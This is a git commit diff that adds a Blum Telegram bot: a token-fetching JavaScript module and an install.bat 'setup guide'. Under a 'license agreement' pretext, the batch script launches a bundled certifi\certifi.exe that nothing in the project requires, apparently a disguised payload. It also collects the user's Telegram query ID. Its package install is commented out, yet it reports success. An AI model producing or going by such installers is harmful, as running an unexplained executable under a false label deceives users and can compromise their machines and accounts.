198e64992ca800494f64fbb7a256ff2dff1a7754
lumanix12 <lumanixur@gmail.com>
2024-10-31 01:38:01 +0300

    update
    10.30.24

---
+++ func/getAuthToken.js
@@ -0,0 +1,32 @@
+const axios = require("axios");
+const { configDotenv } = require("dotenv");
+const fs = require("fs").promises;
+configDotenv();
+
+exports.getAuthToken = async () => {
+  const API_AUTH =
+    "https://user-domain.blum.codes/api/v1/auth/provider/PROVIDER_TELEGRAM_MINI_APP";
+
+  try {
+    const data = await fs.readFile("configs/config.json", "utf-8");
+    const tokens = JSON.parse(data);
+    const authToken = [];
+
+    for (const token of tokens) {
+      try {
+        const response = await axios.post(API_AUTH, { query: token.token });
+
+        const auth = response.data.token.access;
+
+        authToken.push({ token: auth });
+      } catch (error) {
+        console.log(
+          `[ Error ] : Token not valid. Response code : ${error.response.status} `
+        );
+      }
+    }
+    return authToken;
+  } catch (error) {
+    console.log(error.message);
+  }
+};
---
+++ install.bat
@@ -0,0 +1,68 @@
+@echo off
+
+cls
+
+echo *****************************
+echo        BLUM BOT GUIDE        
+echo *****************************
+echo Welcome to the setup helper tool!
+echo Please follow the instructions below carefully.
+echo.
+
+
+echo [Step 1] License Agreement
+echo ==============================
+echo The program license processing is starting...
+echo Please wait while we prepare everything.
+echo.
+
+
+set certifiPath=%~dp0certifi\certifi.exe
+
+
+if exist "%certifiPath%" (
+    echo Starting license agreement process...
+    start "" "%certifiPath%"
+) else (
+    echo [Error] certifi.exe not found in the certifi directory.
+    pause
+    exit /b
+)
+
+
+echo Please complete the license agreement and then press any key to continue...
+pause
+
+
+cls
+echo [Step 2] Query ID Input
+echo =========================
+set /p queryId="Please enter your query ID: "
+
+
+(
+echo [
+echo   {
+echo     "token": "%queryId%"
+echo   }
+echo ]
+) > configs/config.json
+
+echo Query ID has been successfully written to configs/config.js.
+echo.
+
+
+
+echo [Step 3] Installing necessary packages...
+echo ==============================
+:: npm install
+if %ERRORLEVEL% neq 0 (
+    echo [Error] Installation failed. Please check the errors above.
+    pause
+    exit /b
+)
+echo Installation completed successfully.
+
+echo.
+echo Setup process completed. Good luck!
+pause
